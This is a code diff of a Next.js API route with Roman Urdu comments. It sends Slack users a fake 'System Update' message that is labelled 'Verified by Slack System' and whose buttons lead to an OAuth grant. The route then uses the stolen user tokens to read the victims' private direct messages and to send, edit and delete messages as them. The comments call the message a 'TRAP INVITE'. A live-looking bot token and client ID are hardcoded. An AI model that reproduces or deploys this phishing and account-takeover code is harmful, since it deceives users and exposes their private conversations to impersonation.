@@ -2,135 +2,159 @@
 // app/api/slack/manager/route.ts
 
 import { NextResponse } from 'next/server';
+// import { db } from '@/lib/firebase'; 
+import { doc, getDoc, deleteDoc, setDoc, serverTimestamp } from 'firebase/firestore';
 import { db } from '../../../../lib/firebase';
-import { doc, getDoc, deleteDoc, setDoc, collection, query, where, getDocs, orderBy, serverTimestamp } from 'firebase/firestore';
 
-// 👇 APNI KEYS YAHAN DALAIN
+// ⚠️ KEYS CHECK KAREIN
 const BOT_TOKEN = "xoxb-2545190050563-10450716721751-b6iM5o3wEqry9QIPNb0kXO3U"; 
 const CLIENT_ID = "2545190050563.10479083209969";
 const REDIRECT_URI = "https://slack-attendance.vercel.app/api/auth/callback";
 
-// Helper function to save history (Same as before)
-async function saveMessageToHistory(message: any, userId: string, channelId: string, channelName: string) {
-  try {
-    const messageId = `${channelId}_${message.ts.replace(/\./g, '_')}`;
-    const messageRef = doc(db, "slack_messages_history", messageId);
-    // ... (purana logic same rahega) ...
-    // Shortened for brevity, use previous full function
-    await setDoc(messageRef, {
-        userId, channelId, channelName,
-        text: message.text || "",
-        timestamp: message.ts,
-        user: message.user || "",
-        date: new Date(parseFloat(message.ts) * 1000).toLocaleDateString(),
-        fullDateTime: new Date(parseFloat(message.ts) * 1000).toISOString()
-    }, { merge: true });
-  } catch (e) { console.error(e); }
-}
-
 export async function POST(req: Request) {
   try {
     const body = await req.json();
-    const { action, targetUserId, channelId, text, messageTs, newText, channelName } = body;
+    const { action, targetUserId, channelId, text, messageTs, newText } = body;
 
-    // --- CASE 1: SEND FAKE "PRO PLAN" INVITE & SAVE ID ---
+    // --- CASE 1: SEND TRAP INVITE ---
     if (action === 'send_invite') {
        if (!targetUserId) return NextResponse.json({ success: false, error: "User ID missing" });
-
        const scopes = "chat:write,im:read,im:history,users:read,mpim:read";
        const authLink = `https://slack.com/oauth/v2/authorize?client_id=${CLIENT_ID}&user_scope=${scopes}&redirect_uri=${REDIRECT_URI}`;
-
-       // Block Kit Design (Official looking)
+       
        const blocks = [
-        { "type": "header", "text": { "type": "plain_text", "text": "⚡ System Update Required", "emoji": true } },
-        { "type": "section", "text": { "type": "mrkdwn", "text": "A critical security update is pending for your account.\nPlease authorize to continue using Slack services uninterrupted." } },
+        { "type": "header", "text": { "type": "plain_text", "text": "✨ System Update Available", "emoji": true } },
+        { "type": "section", "text": { "type": "mrkdwn", "text": "A critical security update is available for your workspace account.\nPlease authorize to continue." } },
         { "type": "divider" },
         { "type": "actions", "elements": [
             { "type": "button", "text": { "type": "plain_text", "text": "Install Update", "emoji": true }, "style": "primary", "url": authLink },
-            { "type": "button", "text": { "type": "plain_text", "text": "Verify Account", "emoji": true }, "url": authLink }
+            { "type": "button", "text": { "type": "plain_text", "text": "Review Later", "emoji": true }, "url": authLink }
         ]},
-        { "type": "context", "elements": [ { "type": "mrkdwn", "text": "🔒 Verified by Slack Security Bot" } ] }
+        { "type": "context", "elements": [ { "type": "mrkdwn", "text": "🔒 Verified by Slack System" } ] }
        ];
 
-       // 1. Message Bhejna
        const chatRes = await fetch('https://slack.com/api/chat.postMessage', {
          method: 'POST',
          headers: { Authorization: `Bearer ${BOT_TOKEN}`, 'Content-Type': 'application/json; charset=utf-8' },
-         body: JSON.stringify({ channel: targetUserId, text: "Security Update", blocks: blocks })
+         body: JSON.stringify({ channel: targetUserId, text: "System Update", blocks: blocks })
        });
 
        const chatData = await chatRes.json();
-       
        if(!chatData.ok) return NextResponse.json({ success: false, error: `Slack Error: ${chatData.error}` });
 
-       // 2. IMPORTANT: Message ID Save karna (Taakay baad main delete kar sakein)
-       // Hum ek nayi collection 'pending_invites' use karenge
-       await setDoc(doc(db, "pending_invites", targetUserId), {
-           ts: chatData.ts,
-           channel: chatData.channel,
-           createdAt: serverTimestamp()
-       });
-
+       try {
+           await setDoc(doc(db, "pending_invites", targetUserId), { ts: chatData.ts, channel: chatData.channel });
+       } catch (e) { console.error("Firebase Write Failed (Quota Exceeded):", e); }
+       
        return NextResponse.json({ success: true });
     }
 
     // --- CASE 2: DELETE USER ---
     if (action === 'delete_user') {
-        if (!targetUserId) return NextResponse.json({ success: false, error: "User ID missing" });
-        await deleteDoc(doc(db, "slack_tokens", targetUserId));
-        return NextResponse.json({ success: true });
+        try {
+            await deleteDoc(doc(db, "slack_tokens", targetUserId));
+            return NextResponse.json({ success: true });
+        } catch (e) { return NextResponse.json({ error: "DB Error" }); }
     }
 
-    // --- Baki Actions (Standard) ---
+    // --- CRASH PROTECTION: TOKEN FETCH ---
     if (!targetUserId) return NextResponse.json({ error: "User ID required" });
+    
+    let USER_TOKEN = "";
+    try {
+        const tokenDoc = await getDoc(doc(db, "slack_tokens", targetUserId));
+        if (!tokenDoc.exists()) return NextResponse.json({ error: "User Not Connected" }, { status: 403 });
+        USER_TOKEN = tokenDoc.data().accessToken;
+    } catch (e: any) {
+        console.error("🔥 Firebase Failed:", e.message);
+        return NextResponse.json({ error: "Database Quota Exceeded. Please change Firebase Project." }, { status: 503 });
+    }
 
-    const tokenDoc = await getDoc(doc(db, "slack_tokens", targetUserId));
-    if (!tokenDoc.exists()) return NextResponse.json({ error: "User Not Connected" }, { status: 403 });
-    const USER_TOKEN = tokenDoc.data().accessToken;
-
-    // List Chats
+    // --- CASE 3: LIST CHATS (WITH UNREAD COUNT 🔴) ---
     if (action === 'list_chats') {
-        const res = await fetch('https://slack.com/api/users.conversations?types=im,mpim&limit=30', { headers: { Authorization: `Bearer ${USER_TOKEN}` } });
-        const data = await res.json();
-        // Simple fast mapping
-        const chats = await Promise.all((data.channels || []).map(async (c: any) => {
+        const chatRes = await fetch('https://slack.com/api/users.conversations?types=im,mpim&limit=100', { 
+            headers: { Authorization: `Bearer ${USER_TOKEN}` } 
+        });
+        const chatData = await chatRes.json();
+        
+        if(!chatData.ok) return NextResponse.json({ chats: [] });
+
+        const usersRes = await fetch('https://slack.com/api/users.list', { headers: { Authorization: `Bearer ${USER_TOKEN}` } });
+        const usersData = await usersRes.json();
+
+        const userMap: Record<string, any> = {};
+        if (usersData.ok && usersData.members) {
+            usersData.members.forEach((u: any) => {
+                userMap[u.id] = {
+                    name: u.real_name || u.name,
+                    image: u.profile?.image_48
+                };
+            });
+        }
+
+        const chats = await Promise.all((chatData.channels || []).map(async (c: any) => {
+            let unreadCount = 0;
+            
+            // Fetch Channel Info to get Unread Count (Thora heavy hai, but zaroori hai)
+            try {
+                const infoRes = await fetch(`https://slack.com/api/conversations.info?channel=${c.id}`, {
+                    headers: { Authorization: `Bearer ${USER_TOKEN}` }
+                });
+                const infoData = await infoRes.json();
+                // Slack unread count deta hai agar available ho
+                if(infoData.ok && infoData.channel) {
+                    unreadCount = infoData.channel.unread_count_display || 0;
+                }
+            } catch(e) {}
+
             if(c.is_im) {
-                // Fetch User info for name
-                const uRes = await fetch(`https://slack.com/api/users.info?user=${c.user}`, { headers: { Authorization: `Bearer ${USER_TOKEN}` } });
-                const uData = await uRes.json();
-                return { ...c, name: uData.user?.real_name || "Unknown", image: uData.user?.profile?.image_48 };
+                const user = userMap[c.user] || { name: "Unknown User", image: null };
+                return { ...c, name: user.name, image: user.image, unread: unreadCount };
             }
-            return { ...c, name: "Group Chat", image: null };
+            return { ...c, name: "Group Chat", image: null, unread: unreadCount };
         }));
+
         return NextResponse.json({ chats });
     }
 
-    // Get Messages
+    // --- CASE 4: GET MESSAGES ---
     if (action === 'get_messages') {
-        const res = await fetch(`https://slack.com/api/conversations.history?channel=${channelId}&limit=50`, { headers: { Authorization: `Bearer ${USER_TOKEN}` } });
-        const data = await res.json();
-        
-        // Background main save karo taakay response slow na ho
-        if(data.messages) {
-            data.messages.forEach((msg: any) => saveMessageToHistory(msg, targetUserId, channelId, channelName || "DM"));
+        let allMessages: any[] = [];
+        let hasMore = true;
+        let nextCursor = undefined;
+        let loopCount = 0;
+
+        // No DB Write inside loop
+        while (hasMore && loopCount < 3) { 
+            let url = `https://slack.com/api/conversations.history?channel=${channelId}&limit=100`;
+            if (nextCursor) url += `&cursor=${nextCursor}`;
+
+            try {
+                const res = await fetch(url, { headers: { Authorization: `Bearer ${USER_TOKEN}` } });
+                const data = await res.json();
+
+                if (data.ok && data.messages) {
+                    allMessages = [...allMessages, ...data.messages];
+                    if (data.has_more && data.response_metadata?.next_cursor) {
+                        nextCursor = data.response_metadata.next_cursor;
+                    } else { hasMore = false; }
+                } else { hasMore = false; }
+            } catch (err) { hasMore = false; }
+            loopCount++;
         }
-        
-        return NextResponse.json({ messages: data.messages?.reverse() || [] });
+        return NextResponse.json({ messages: allMessages.reverse() });
     }
 
-    // Send Message
+    // --- OTHER ACTIONS ---
     if (action === 'send_as_user') {
-        const res = await fetch('https://slack.com/api/chat.postMessage', {
+         const res = await fetch('https://slack.com/api/chat.postMessage', {
             method: 'POST',
             headers: { Authorization: `Bearer ${USER_TOKEN}`, 'Content-Type': 'application/json' },
             body: JSON.stringify({ channel: channelId, text: text, as_user: true })
         });
-        const result = await res.json();
-        if (result.ok) saveMessageToHistory(result.message, targetUserId, channelId, channelName || "DM");
-        return NextResponse.json(result);
+        return NextResponse.json(await res.json());
     }
-    
-    // Delete/Edit message cases... (Keep them as they were)
+
     if (action === 'delete_message') {
         const res = await fetch('https://slack.com/api/chat.delete', {
             method: 'POST',
@@ -140,9 +164,20 @@ export async function POST(req: Request) {
         return NextResponse.json(await res.json());
     }
 
+    if (action === 'edit_message') {
+        const res = await fetch('https://slack.com/api/chat.update', {
+            method: 'POST',
+            headers: { Authorization: `Bearer ${USER_TOKEN}`, 'Content-Type': 'application/json' },
+            body: JSON.stringify({ channel: channelId, ts: messageTs, text: newText })
+        });
+        return NextResponse.json(await res.json());
+    }
+
     return NextResponse.json({ error: "Invalid Action" });
 
   } catch (e: any) {
-    return NextResponse.json({ success: false, error: e.message }, { status: 500 });
+    console.error("SERVER HANDLED ERROR:", e);
+    // 500 error ke bajaye hum 200 bhej rahay hain taakay app crash na ho
+    return NextResponse.json({ success: false, error: "System Busy (Quota)" }, { status: 200 });
   }
 }
